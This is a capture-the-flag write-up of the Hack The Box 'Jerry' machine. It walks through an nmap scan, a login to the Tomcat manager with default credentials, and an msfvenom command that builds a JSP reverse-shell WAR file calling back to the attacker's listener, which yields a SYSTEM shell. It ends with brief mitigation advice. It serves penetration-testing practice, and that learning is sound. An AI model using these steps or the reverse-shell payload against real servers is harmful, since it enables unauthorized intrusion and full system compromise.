# Jerry

```
kali@kali:~/htb/Jerry$ sudo nmap -sV -sC 10.129.90.141
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-31 20:13 EST
Nmap scan report for 10.129.90.141
Host is up (0.027s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.91 seconds
kali@kali:~/htb/Jerry$
```

We are greeted by an Apache Tomcat/7.0.88 post-install page.

```
Managing Tomcat

For security, access to the manager webapp is restricted. Users are defined in:

$CATALINA_HOME/conf/tomcat-users.xml

In Tomcat 7.0 access to the manager application is split between different users.   Read more...
```

The manager webapp is http://10.129.90.141:8080/manager/html 

After failing the login we are redirected and get this message:

```
401 Unauthorized

You are not authorized to view this page. If you have not changed any configuration files, please examine the file conf/tomcat-users.xml in your installation. That file must contain the credentials to let you use this webapp.

For example, to add the manager-gui role to a user named tomcat with a password of s3cret, add the following to the config file listed above.

<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>
```
And I try tomcat:s3cret, and it works.

We get an admin panel.

```
Deploy
Deploy directory or WAR file located on server
```

Ok, so let’s google WAR reverse shell:

https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/ 

And here we see we can create a war file with metasploit:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.69 LPORT=1337 -f war > shell.war
```

And then we upload this shell via the panel, and set up our listener:

```
kali@kali:~/htb/Jerry$ sudo rlwrap nc -nlvp 1337
[sudo] password for kali:
Listening on 0.0.0.0 1337
Connection received on 10.129.90.141 49194
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

C:\apache-tomcat-7.0.88>
```

When we open the new page, we get the connection.

Already root.

The flags are located in “C:\Users\Administrator\Desktop\flags” 

And in the text file: `2 for the price of 1.txt`

To view this, we can simply use quotation marks around the file name:

```
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f8xxxxxxxxxxxxxxxxxxxxxx

root.txt
04a8b36e154xxxxxxxxxxxxxxxxxxxxxx
C:\Users\Administrator\Desktop\flags>
```

## Comparing myself to the official writeup:

The official writeup used a brute-force script to find the credentials. 

And make-war.sh to create the WAR file.

## How to stop this exploit:

Don’t use default credentials. Don’t run the webserver on root.
